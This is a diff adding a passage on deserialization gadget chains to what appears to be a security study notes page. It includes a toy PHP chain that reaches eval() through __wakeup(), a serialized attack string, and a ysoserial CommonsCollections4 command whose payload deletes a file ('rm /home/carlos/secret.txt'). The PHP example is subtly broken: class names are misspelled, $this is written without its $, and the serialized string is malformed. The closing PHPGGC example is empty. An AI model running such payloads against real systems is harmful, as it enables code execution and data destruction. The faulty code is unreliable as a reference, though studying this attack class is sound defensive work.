@@ -532,4 +532,61 @@ class Program
 
 ```
 
+### Gadget chains <a href="#gadget-chains" id="gadget-chains"></a>
+
+Gadget chains involve leveraging pre-existing code snippets, or "gadgets," in an application to achieve exploitation during deserialization. By chaining these gadgets, an attacker can indirectly manipulate serialized data to invoke dangerous code paths.
+
+#### Example of Gadget Chains
+
+PHP Example;
+
+imagine an attacker exploits  a gadget chain  in PHP, starting with a magic method like <mark style="color:red;">**`__wekeup()`**</mark>
+
+<pre class="language-php"><code class="lang-php">&#x3C;?
+class GedgetA{
+    public $next;
+    public function __wakeup(){
+    
+    $this->next->trigger();
+    }
+}
+class GadgetB {
+    public $payload;
+    public function trigger() {
+    eval(this->payload); // Dangerous operation
+    }
+}
+// attacker-crafted serialization-data
+$maliciousData = 'O:7:"GadgetA":1:{s:4:"next";O:7:"GadgetB":1:{s:7:"payload";s:12"phpinfo();";}}'
+
+unserialize($maliciousData);
+
+<strong>?>
+</strong></code></pre>
+
+**Explanation:**
+
+* **GadgetA**: <mark style="color:red;">**`__wakeup()`**</mark> method calls <mark style="color:red;">**`trigger()`**</mark> on <mark style="color:red;">**`next`**</mark>.
+* **GadgetB**: <mark style="color:red;">**`trigger()`**</mark> method executes the payload using <mark style="color:red;">**`eval()`**</mark>.
+* **Malicious Data**: The attacker constructs a serialized chain that sets `next` to a `GadgetB` object with a payload, leading to code execution.
+
+Example in Java using ysoseial:
+
+In Java, gadget chains can be constructed using libraries like Apache Commons Collections. The ysoserial tool automates this for known chains.
+
+{% code overflow="wrap" %}
+```sh
+java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+     --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+     --add-opens=java.base/java.net=ALL-UNNAMED \
+     --add-opens=java.base/java.util=ALL-UNNAMED \
+     -jar Downloads/ysoserial-0.0.6-all.jar CommonsCollections4 'rm /home/carlos/secret.txt'
+```
+{% endcode %}
+
+PHP Example Using PHPGGC:
+
+```
+```
+
 [^1]: 
